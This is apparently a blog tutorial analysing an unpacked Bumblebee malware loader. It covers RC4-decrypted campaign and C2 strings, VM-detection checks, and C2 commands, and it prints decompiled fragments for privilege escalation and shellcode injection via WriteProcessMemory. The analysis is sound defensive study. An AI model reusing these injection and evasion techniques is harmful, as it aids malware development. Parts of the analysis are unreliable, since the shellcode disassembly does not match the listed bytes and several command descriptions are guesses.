**Background** : This is an analysis of an unpacked bumblebee. This is meant to be a little reversing tutorial, as well as a demonstration of some basic reverse engineering and research skills I learned. 
The unpacked sample was downloaded from malware bazaar. I found the hash through this [article](https://bin.re/blog/the-dga-of-bumblebee/)

Bumblebee has two exports. As it is a dll, it's exports important because they contain the main functions of the malware.
We are going to look at the export starting at ```start	0000000140057D2C	[main entry]```
This is the 'main' function of the malware.  

![image1](/resources/bumblebee/image1.png)

![image2](/resources/bumblebee/image2.png)

When we scroll into the main function a little, we can see a string being passed as an argument:
![image3](/resources/bumblebee/image3.png)



I know that bumblebee uses RC4 encryption from two sources. One, from reading about the malware from articles like [this](https://www.proofpoint.com/us/blog/threat-insight/bumblebee-is-still-transforming) and two, from Flare's capa explorer plugin which indicates it found a pattern matching RC4 encryption. 

![image4](/resources/bumblebee/image4.png)

Shortly after this string, a function call is made that takes another intersting string as an arugment

![alt text](/resources/bumblebee/image5.png)

![alt text](/resources/bumblebee/image-1.png)

Here is the hex representation of the second string: 
`7AE5E93A3176116F05E7D9340565B7993D86C48D5E36147BE7D546D28CAFA0F1F2698B11951B24D9702DB827A70990F6F9272677B4187F616F58350DDC7BA3B8F49F66115DF39529B63F7FA7C3581D41`

![alt text](/resources/bumblebee/image-2.png)

If we use the initial interesting string as a passphrase for a RC4 encryption algorithm to decrypt the strange jumbled up encrypted looking string, we get an interesting output

![alt text](/resources/bumblebee/image-3.png)

The output reads `lnk1` 
This indicates that this version of bumblebee is being distributed via lnk email attachments. Furthermore, it possibly indicates that the authors of bumblebee set their versioning or campaignIDs to indicate the initial vector of infection. 

There's another argument being passed to a function directly after the lnk1 group string. 

If we apply the same process of decrypting it using RC4, we get a list of IP addresses and ports:

`192.168.0.101:444,127.0.0.1:444,186.218.161.242:270`



Now, something notable to observe here. If we reference some older samples, specifically one researched by Proofpoint back in 2022, we note that the campaignID was previoiusly stored in plaintext. 


The sample I'm analysing comes from [here](https://bazaar.abuse.ch/browse.php?search=sha256%3Aaf59ce785e062bf0d198eb4e3bdbc1ee57d58164de6dc1faf38836c670ef6f7d) 
It was uploaded in September of 2023 and has a compilation timestamp of `2023-09-04 09:02:26`
We note that the campaignID is no longer being stored in plaintext and instead encrypted via RC4. We can conclude that Bumblebee was seeing active development since the 2022 Proofpoint blog.

Shortly after, the malware generates hashes and passes them to the `CreateEventW` API call. The hash is generated by querying WMI for the hostname and UUID of the system and concatinating the values. This creates a unique value.
```
  ntdll_handle();
  SELECT__FROM_Win32_ComputerSystem(v142);
  SELECT__FROM_Win32_ComputerSystemProduct(v149);
  append_string(v141, v149, v142);
  v156 = 0i64;
  v157 = 0i64;
  v158 = 0i64;
  v159 = 0i64;
  v160 = 0i64;
  v161 = 0i64;
  v162 = 0i64;
  v163 = 0i64;
  intialize_md5(v155);
  intialize_md5(v155);
  v25 = v141;
  if ( v141[3] >= 0x10ui64 )
    v25 = v141[0];
  md5_related(v155, v25, v141[2]);
  md5_related_0(v155);
  convert_hash_to_hex(ArgList, v164);
  ascii_to_utf16(lpName, ArgList);
  v26 = lpName;
  if ( v112 >= 8 )
    v26 = lpName[0];
  hObject = CreateEventW(0i64, 0, 0, v26);
  if ( hObject )
  {
    if ( GetLastError() == ERROR_ALREADY_EXISTS )
```

`CreateEventW` is used to ensure the malware isn't already running, hence the check shown in the screenshot against error code 183 or `ERROR_ALREADY_EXISTS`

Following this we see some strings indicating the malware is collecting information about the infected host. Specifically username and Domain name.
![alt text](/resources/bumblebee/image8.png)
![alt text](/resources/bumblebee/image9.png)

### Anti-Analysis

##### VM Detection

There's a function that has a lot of strings related to virtual machines. 
It runs a series of functions that check to see if Bumblebee is running on a virtual machine. 

Here's an example: 
```
v1 = SysAllocString(L"WQL");
v2 = SysAllocString(L"SELECT * FROM Win32_BaseBoard");
```
Here, bumblebee queries the wql (sql for wmi) for `Win32_BaseBoard`. This is basically querying wmi for the host's motherboard. 

It then continues to check if the motherboard is a vmware motherboard here: 

```
      (*(*v5 + 32i64))(v5, 0xFFFFFFFFi64, 1i64, &v13, &v12);
        if ( !v12 )
          break;
        if ( (*(*v13 + 32i64))(v13, L"Product", 0i64, &pvarg, 0i64, 0i64) >= 0 && pvarg.vt != 1 )
        {
          if ( (pvarg.vt & 8) != 0 && wcsstr(pvarg.bstrVal, L"VirtualBox") )
            v0 = 1;
          VariantClear(&pvarg);
        }
        memset(v9, 0, sizeof(v9));
        v10 = 0;
        v11 = 0;
        *&pvarg.vt = *v9;
        pvarg.pRecInfo = (0i64 >> 112);
        if ( (*(*v13 + 32i64))(v13, L"Manufacturer", 0i64, &pvarg, 0i64, 0i64) >= 0 && pvarg.vt != 1 )
        {
          if ( (pvarg.vt & 8) != 0 )
          {
            if ( wcsstr(pvarg.bstrVal, L"Oracle Corporation") )
```
Keep in mind, this is just one check. There are various others for other virtualization platforms including qemu, virtualbox and parallels 
### C2 Command Handling

This section of code looks like it's related to the handling of commands sent by the C2. There are various command names, each one doing something different. The commands I have found are shi, dij, dex, sdl, ins, gdt and plg
Let's look at what shi does in dpeth, then summarize what the rest of the commands do.

#### shi

If Bumblebee recieves the shi command, a function is called that does various interesting things.

First, an API call to GetSpecialFolderPath with an interesting array of paths
![alt text](/resources/bumblebee/image10.png)

Then a function is called that generates a random executable name. This is likely to avoid basic file-name based detection
![alt text](/resources/bumblebee/image11.png)

We then enter a subroutine that gathers information about the infected host.
![alt text](/resources/bumblebee/image12.png)

Bumblebee then loops through it's own threads using `CreateToolhelp32Snapshot`, tries finding a specific one, then opens it

![alt text](/resources/bumblebee/image13.png)

Bumblebee loads Advapi32.dll and uses 

```  
  hObject = a1;
  v7 = 0ui64;
  LibraryA = LoadLibraryA("Advapi32.dll");
  OpenProcessToken = GetProcAddress(LibraryA, "OpenProcessToken");
  CurrentProcess = GetCurrentProcess();
  if ( !(OpenProcessToken)(CurrentProcess, 40i64, &hObject) )
    return 0i64;
  if ( !LookupPrivilegeValueW(0i64, L"SeDebugPrivilege", &Luid) )
  {
    CloseHandle(hObject);
    return 0i64;
  }
  *(&v7 + 4) = Luid;
  LODWORD(v7) = 1;
  HIDWORD(v7) = 2;
  AdjustTokenPrivileges = GetProcAddress(LibraryA, "AdjustTokenPrivileges");
  v6 = (AdjustTokenPrivileges)(hObject, 0i64, &v7, 16i64, 0i64, 0i64);
  CloseHandle(hObject);
  return v6;
```

#### dij
After performing privilege escalation, bumblebee writes shellcode to memory. Specifically, bumblebee overwrites the Sleep function in Windows with shellcode: 

```
  v6[0] = 1220555080;                           // These variables are actually shellcode beind displayed as decimal
                                                // 
  v6[1] = 826858033;
  v6[2] = 65583561;
  v6[3] = 28966912;
  v6[4] = 1207959552;
  v7 = -72;
  *&v8[7] = -338624751;
  v9 = -33;
  ModuleHandleA = GetModuleHandleA("kernel32.dll");
  *v8 = GetProcAddress(ModuleHandleA, "SleepEx");// overwriting Sleep with shellcode
  v3 = ntdll_handle_look_for_specific_mem_section(hProcess);
  WriteProcessMemory = GetProcAddress(ModuleHandleA, "WriteProcessMemory");
  VirtualProtectEx(hProcess, v3, 0x21ui64, 0x40u, &flOldProtect);
  result = (WriteProcessMemory)(hProcess, v3, v6, 33i64, &v11);
  if ( result )
  {
    VirtualProtectEx(hProcess, v3, 0x21ui64, flOldProtect, &flOldProtect);
    return 1i64;
  }
  return result;

```
Let's take a closer look at v6-v9. If we convert the decimal values to hex values, it will look like this: 
```
  v6[0] = 0x48C03148;                      
  v6[1] = 0x3148DA31;
  v6[2] = 0x3E8B9C9;
  v6[3] = 0x1BA0000;
  v6[4] = 0x48000000;
  v7 = 0xB8;
  *&v8[7] = 0xEBD0FF11;
  v9 = 0xDF;
```

If we compile this code and disassemble it we get this: 

```
.text:0000000000400080                 public _start
.text:0000000000400080 _start:                                 ; DATA XREF: LOAD:0000000000400018â†‘o
.text:0000000000400080                 sal     byte ptr [rcx], 48h ; Alternative name is '_start'
.text:0000000000400080                                         ; shellcode
.text:0000000000400084                 xor     [rax-26h], ecx
.text:0000000000400087                 xor     [rsi], edi
.text:0000000000400089                 mov     ebx, [rcx+rdx*4+480000BAh]
.text:0000000000400089 ; ---------------------------------------------------------------------------
.text:0000000000400090                 dq 11FFD0EBB8000000h, 3CB8FFFFFFE2E8DFh
.text:00000000004000A0                 db 3 dup(0), 31h, 0FFh, 0Fh, 5
.text:00000000004000A0 _text           ends
.text:00000000004000A0
.text:00000000004000A0
.text:00000000004000A0                 end _start
```
Following this, bumblebee injects itself into NtQueueApcThread by 



#### dex
Could be used to download and execute
the `dex` command appears to queue bumblebee to create a randomly named .exe file



#### sdl 
Looks as though it runs cmd.exe and runs mkdir and copy
Additionally it looks like it is at least initializing COM proxies 
Also has ability to open Powershell
Potentially able to remove files from the victim 

#### ins 
powershell remove dirs 

#### gdt

Not too sure what this one does

#### plg
Domain generation and connection handling 